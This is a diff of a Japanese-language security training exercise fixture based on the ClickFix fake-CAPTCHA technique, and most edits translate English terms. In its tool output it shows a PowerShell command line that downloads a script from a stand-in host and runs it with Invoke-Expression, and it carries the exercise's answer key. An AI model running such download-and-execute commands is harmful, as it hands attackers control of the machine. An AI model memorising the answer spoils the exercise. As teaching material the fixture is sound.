@@ -5,8 +5,8 @@
   "platform": "windows",
   "level": "intermediate",
   "ground_truth": "block",
-  "title": "ClickFix / Fake CAPTCHA",
-  "request": "稼働中のProcessを継続させますか。 ALLOW / BLOCKで判断してください。",
+  "title": "偽CAPTCHAによるコマンド実行誘導",
+  "request": "稼働中のプロセスを継続させますか。 ALLOW / BLOCKで判断してください。",
   "initial_information": {
     "Process": "powershell.exe",
     "PID": 4200,
@@ -22,7 +22,7 @@
     {
       "id": "pe",
       "name": "Process Explorer",
-      "description": "実行Path・Command Line・親Process・ロード済みDLLを確認します。",
+      "description": "実行パス・コマンドライン・親プロセス・ロード済みDLLを確認します。",
       "output": "Parent: explorer.exe (1800)\nPID: 4200\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nCommand line: powershell.exe -NoProfile -Command \"$response = iwr https://verify-meeting.example/check.ps1; Invoke-Expression -Command $response.Content\"\nUser: ASTER\\mori\nLoaded DLLs (抜粋):\nC:\\Windows\\System32\\kernel32.dll",
       "accepted_information_types": [
         "pid"
@@ -41,7 +41,7 @@
       "output_information": [
         {
           "id": "image",
-          "label": "Backing Executable",
+          "label": "実体ファイル",
           "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
           "data_type": "file"
         }
@@ -50,7 +50,7 @@
     {
       "id": "sig",
       "name": "Sigcheck",
-      "description": "署名の検証状態・Publisherを確認します。PID入力ではBacking Executableが対象です。",
+      "description": "署名の検証状態・発行元を確認します。PIDを入力した場合は対応する実体ファイルが対象です。",
       "output": "PID 4200 のBacking Executable: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nVerified: Signed\nPublisher: Microsoft Windows",
       "accepted_information_types": [
         "pid"
@@ -71,8 +71,8 @@
   "references": [
     {
       "id": "official",
-      "name": "Official Service / Domain",
-      "content": "承認会議サービスmeet.aster.exampleの認証はBrowser内で完了する。Win+R、Terminal、Scriptの実行によるCAPTCHA手順は存在しない。"
+      "name": "公式サービス・ドメイン",
+      "content": "承認会議サービスmeet.aster.exampleの認証はブラウザー内で完了する。Win+R、Terminal、スクリプトの実行によるCAPTCHA手順は存在しない。"
     }
   ],
   "external_references": [],
@@ -409,17 +409,17 @@
       ]
     }
   ],
-  "explanation": "CAPTCHAの案内で貼り付けたCommandは、PowerShellによる外部Scriptの取得・実行でした。人間確認にOS Commandを使わない公式手順と矛盾するため停止します。",
-  "topic": "利用者の操作経緯と実行中Commandを照合する",
-  "summary": "利用者の操作経緯と実行中Commandを照合する",
+  "explanation": "CAPTCHAの案内で貼り付けたコマンドは、PowerShellによる外部スクリプトの取得・実行でした。人間確認にOSコマンドを使わない公式手順と矛盾するため停止します。",
+  "topic": "利用者の操作経緯と実行中コマンドを照合する",
+  "summary": "利用者の操作経緯と実行中コマンドを照合する",
   "learning_objectives": [
-    "利用者の操作経緯と実行中Commandを照合する"
+    "利用者の操作経緯と実行中コマンドを照合する"
   ],
   "decision_context": "running_process",
   "scenario_type": "real_world_inspired",
   "sources": [
     "https://attack.mitre.org/techniques/T1204/004/"
   ],
-  "fixture_note": "組織・Domain・IP・Package・Hash・記録は架空の保存済み教材。IPは文書用アドレスで、RDAP・外部評判も実照会ではない。時刻は2026-08-18を基準とし、出力は必要なフィールドの抜粋。実行可能なPayloadは配布しない。 各問題は独立した端末・案件のSnapshot。PID・時刻の再利用は問題間の関連を意味しない。時刻はZ表記以外すべてJST。",
+  "fixture_note": "登場する組織名、ドメイン、IPアドレス、パッケージ名、ハッシュ値、記録は架空のものです。IPアドレスには文書用アドレスを使い、RDAPや外部評判の照会も実際には行っていません。時刻は2026-08-18を基準とし、必要な項目だけを抜粋しています。実行可能なペイロードは配布していません。各問題は独立した端末・案件の状態を表すスナップショットです。PIDや時刻の再利用は問題間の関連を意味しません。Z付きの時刻を除き、時刻はすべて日本標準時（JST）です。",
   "inspired_by": "ClickFix / Fake CAPTCHA"
 }
